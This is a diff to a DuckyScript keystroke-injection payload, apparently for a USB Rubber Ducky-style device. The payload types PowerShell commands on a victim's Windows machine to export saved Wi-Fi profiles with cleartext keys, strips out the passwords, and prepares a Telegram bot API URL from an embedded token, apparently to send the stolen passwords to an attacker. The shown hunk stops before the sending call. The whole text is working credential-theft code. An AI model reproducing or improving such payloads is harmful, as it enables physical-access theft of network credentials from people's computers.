@@ -10,10 +10,7 @@ DELAY 500
 STRING $token='%TELE_TOKEN%'
 ENTER
 DELAY 500
-STRING cmd /c "netsh wlan export profile key=clear"
-ENTER
-DELAY 500
-STRING Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-fi.txt; $WiFi = [IO.File]::ReadAllText(".\Wi-fi.txt"); rm Wi-*
+STRING netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > Wi-fi.txt ; $WiFi = [IO.File]::ReadAllText(".\Wi-fi.txt"); rm Wi-*
 ENTER
 DELAY 500
 STRING $URL='https://api.telegram.org/bot{0}' -f $token
